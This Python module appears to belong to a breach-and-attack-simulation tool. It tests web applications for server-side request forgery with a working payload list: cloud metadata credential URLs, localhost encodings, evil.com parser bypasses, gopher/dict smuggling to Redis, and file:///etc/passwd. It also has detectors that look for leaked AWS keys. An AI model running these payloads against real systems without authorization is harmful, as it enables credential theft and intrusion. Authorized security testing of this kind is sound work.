"""
Server-Side Request Forgery (SSRF) testing module.

Tests for SSRF by injecting URLs pointing to internal services,
cloud metadata endpoints, and controlled callback servers.

MITRE ATT&CK: T1090 - Proxy, T1552.005 - Cloud Instance Metadata
"""

from __future__ import annotations

import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# SSRF payloads targeting internal services and cloud metadata
DEFAULT_SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",       # Octal
    "http://2130706433",        # Decimal
    "http://0x7f000001",        # Hex
    "http://127.1",
    "http://127.0.0.1:22",     # SSH
    "http://127.0.0.1:3306",   # MySQL
    "http://127.0.0.1:6379",   # Redis
    "http://127.0.0.1:9200",   # Elasticsearch
    # Cloud metadata - AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # Cloud metadata - GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    # Cloud metadata - Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal network scanning
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.1.1",
    # URL scheme bypasses
    "http://127.0.0.1:80@evil.com",
    "http://evil.com#@127.0.0.1",
    "http://127.0.0.1.evil.com",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    # DNS rebinding (requires external callback)
    "http://spoofed.burpcollaborator.net",
]


class SSRFModule(BaseAttackModule):
    """SSRF testing - internal access, cloud metadata, protocol smuggling."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="ssrf",
            description="Server-Side Request Forgery - internal access, cloud metadata, protocol smuggling",
            category="ssrf",
            mitre_technique_ids=["T1090", "T1552.005"],
            mitre_technique_names=["Proxy", "Cloud Instance Metadata API"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT,
            owasp_category="A10:2021 - Server-Side Request Forgery",
            cwe_ids=["CWE-918"],
            tags=["ssrf", "cloud", "internal"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("ssrf", limit=100)
            if db_payloads:
                return db_payloads
        return DEFAULT_SSRF_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", ["url", "uri", "link", "src", "href", "redirect", "callback", "next", "path", "file"])
        path = options.get("path", "/")

        for payload in payloads:
            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                requests.append(AttackRequest(
                    request_id=f"ssrf-{req_id}",
                    target=target,
                    method=options.get("method", "GET"),
                    path=path,
                    params={param: payload},
                    headers={"X-BAS-Payload": payload},
                    follow_redirects=False,
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        payload_used = request.headers.get("X-BAS-Payload", payload)

        # Cloud metadata detection
        cloud_indicators = [
            ("ami-id", "AWS metadata accessible", "critical"),
            ("instance-id", "AWS metadata accessible", "critical"),
            ("iam", "AWS IAM metadata accessible", "critical"),
            ("AccessKeyId", "AWS credentials exposed", "critical"),
            ("SecretAccessKey", "AWS secret key exposed", "critical"),
            ("computeMetadata", "GCP metadata accessible", "critical"),
            ("azEnvironment", "Azure metadata accessible", "critical"),
        ]

        for indicator, desc, severity in cloud_indicators:
            if indicator in body:
                return ModuleResult(
                    module_name="ssrf",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SSRF confirmed: {desc} - '{indicator}' in response",
                    severity=severity,
                    mitre_technique_id="T1552.005",
                    detail={"detection_type": "cloud_metadata", "indicator": indicator},
                )

        # Internal service detection
        internal_indicators = [
            ("root:x:0:0", "/etc/passwd accessible via file:// SSRF", "critical"),
            ("[boot loader]", "win.ini accessible via file:// SSRF", "critical"),
            ("redis_version", "Redis accessible via SSRF", "high"),
            ("elasticsearch", "Elasticsearch accessible via SSRF", "high"),
            ("SSH-", "SSH banner via SSRF", "high"),
            ("mysql_native_password", "MySQL accessible via SSRF", "high"),
        ]

        for indicator, desc, severity in internal_indicators:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="ssrf",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SSRF confirmed: {desc}",
                    severity=severity,
                    mitre_technique_id="T1090",
                    detail={"detection_type": "internal_service"},
                )

        # Blind SSRF indicators (response differences)
        if "169.254.169.254" in payload_used or "metadata" in payload_used:
            if response.status_code == 200 and len(body) > 0:
                return ModuleResult(
                    module_name="ssrf",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Potential blind SSRF: metadata endpoint returned {response.status_code} with {len(body)} bytes",
                    severity="medium",
                    mitre_technique_id="T1090",
                    detail={"detection_type": "blind_ssrf"},
                )

        return ModuleResult(
            module_name="ssrf",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
